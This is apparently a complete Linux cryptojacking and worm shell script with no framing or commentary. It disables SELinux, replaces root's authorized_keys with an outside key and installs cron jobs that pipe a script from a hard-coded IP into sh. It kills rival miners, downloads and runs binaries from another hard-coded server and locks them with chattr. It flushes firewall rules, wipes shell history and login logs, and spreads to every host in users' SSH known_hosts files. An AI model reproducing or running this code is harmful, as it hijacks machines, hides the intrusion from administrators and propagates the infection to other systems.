uname -a
id
hostname
setenforce 0 2>/dev/null
ulimit -n 50000
ulimit -u 50000
rtdir="/etc/sysupdates"
rtdira="/etc/wgeta"
rtdirb="/etc/wgetb"
notlsaa="http://103.85.84.57:20331/notls_x86"
notlsbb="http://103.85.84.57:20331/notls_x86_64"
soft32a="http://103.85.84.57:20331/Linux-syn25000"
soft64a="http://103.85.84.57:20331/Linux-syn25000"
crontab -r 2>/dev/null
rm -rf /var/spool/cron/* 2>/dev/null
mkdir -p /var/spool/cron/crontabs 2>/dev/null
mkdir -p /root/.ssh 2>/dev/null
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLt5P96D3RYZQBzy+9f6hf+XLfYpq4Vr+s+zzDCvtp3xu6RMXXd718lLAQwlh1M3SZDb0smWKwIbYpRArVST8puBXpNjz96bNn9oySsmjAPIVqGj2qRM5p+fS9SGcgo/YijrY7+eO2mnUpjY+Z5JHQb5r4w6eOMjub2pcMskdirlpb2t5azWdmmkhZ904s4ILEPNxW9IG/A57AHzCxb2QT5p7By0JilVZRVm/d5+f2EnHcIVCmWES6UzclO9dtyv5jImKsBWKqjJZqj8BDqoruIGl8RarGwiMIMnsTusIbJXf7xeGO+VKP+wHNLSTAJAk7if3ob4cBk73RXk00JWOh root@VM_0_14_centos' > /root/.ssh/authorized_keys
echo '*/15 * * * * curl -fsSL 122.51.164.83:7770/ash.sh|sh' > /var/spool/cron/root
echo '*/15 * * * * curl -fsSL 122.51.164.83:7770/ash.sh|sh' > /var/spool/cron/crontabs/root
echo "*/15 * * * * curl -fsSL 122.51.164.83:7770/ash.sh|sh" | crontab -

kill_miner_proc()
{
    ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
    ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
    ps ax|grep -o './[0-9]* -c'| xargs pkill -f
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f stratum
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f minexmr
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f polkitd
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f systemctI
    pkill -f WmiPrwSe
	pkill -f sysupdates
	pkill -f sysupdate
}

downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
	echo $1,$2
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        else
            curl --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cur" ]
    then
        http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        else
            cur --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=10 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
	then
		wget --timeout=10 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wge" ]
    then
        wge --timeout=10 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wge --timeout=10 --tries=100 -O $2 $3
        fi
    fi
}

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "notlsa|notlsb"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "notlsa|notlsb"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
kill_miner_proc
kill_sus_proc

if [ `getconf LONG_BIT` = "64" ]; 
	then
		if [ ! "$(ss -ant|grep '152.136.154.57:25000'|grep 'ESTAB'|grep -v grep)" ];
			then
				if [ -f /tmp/wgeta ]; then
					echo "not tmp runing"
				else
					downloads $soft64a /tmp/wgeta
				fi
				cd /tmp
				chmod 777 wgeta
				sleep 5s
				nohup ./wgeta &
			else
				echo "tmp runing....."
		fi
		chmod 777 /tmp/wgeta
		chattr +i /tmp/wgeta
else
	if [ ! "$(ss -ant|grep '152.136.154.57:25000'|grep 'ESTAB'|grep -v grep)" ];
		then
			if [ -f /tmp/wgetb ]; then
				echo "not tmp runing"
			else
				downloads $soft64a /tmp/wgetb
			fi
			cd /tmp
			chmod 777 wgetb
			sleep 5s
			nohup ./wgetb &
		else
			echo "tmp runing....."
	fi
	chmod 777 /tmp/wgetb
	chattr +i /tmp/wgetb
fi

DIR=$(mktemp -d)
if [ `getconf LONG_BIT` = "64" ]
then
	p=$(ps aux | grep notlsb | grep -v grep | wc -l)
	if [ ${p} -eq 0 ]
		then
			downloads $notlsbb $DIR/notlsb
			echo "not tmp runing"
			cd $DIR
			chmod 777 $DIR/notlsb
			sleep 5s
			nohup ./notlsb &
		else
			echo "tmp runing....."
	fi
	chmod 777 $DIR/notlsb
	chattr +i $DIR/notlsb
else
	p=$(ps aux | grep notlsa | grep -v grep | wc -l)
	if [ ${p} -eq 0 ]
		then
			downloads $notlsaa $DIR/notlsa
			echo "not tmp runing"
			cd $DIR
			chmod 777 $DIR/notlsa
			sleep 5s
			nohup ./notlsa &
		else
			echo "tmp runing....."
	fi
	chmod 777 $DIR/notlsa
	chattr +i $DIR/notlsa
fi

iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
iptables -I INPUT -s 43.245.222.57 -j DROP
service iptables reload
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
yum install -y bash 2>/dev/null
apt install -y bash 2>/dev/null
apt-get install -y bash 2>/dev/null
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL http://122.51.164.83:7770/ash.sh||wget -q -O- http://122.51.164.83:7770/ash.sh)|bash -sh >/dev/null 2>&1 &' & done
fi
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL http://122.51.164.83:7770/ash.sh||wget -q -O- http://122.51.164.83:7770/ash.sh)|bash -sh >/dev/null 2>&1 &' & done
fi
for file in /home/*
do
    if test -d $file
    then
        if [ -f $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then
            for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL http://122.51.164.83:7770/ash.sh||wget -q -O- http://122.51.164.83:7770/ash.sh)|bash -sh >/dev/null 2>&1 &' & done
        fi
    fi
done
find ./ -name '*.js'|xargs grep -L f4ce9|xargs sed -i 's!document.write\('\'\<script\ src=\"http://t.cn/EvlonFh\"\>\</script\>\<script\>OMINEId\(\"a27fcc3ac6b1429eb5639f57bad3327d\",\"-1\"\)\</script\>\'\)\;'!!g'
bash -c 'curl -fsSL 122.51.164.83:7770/bsh.sh|bash' 2>/dev/null
history -c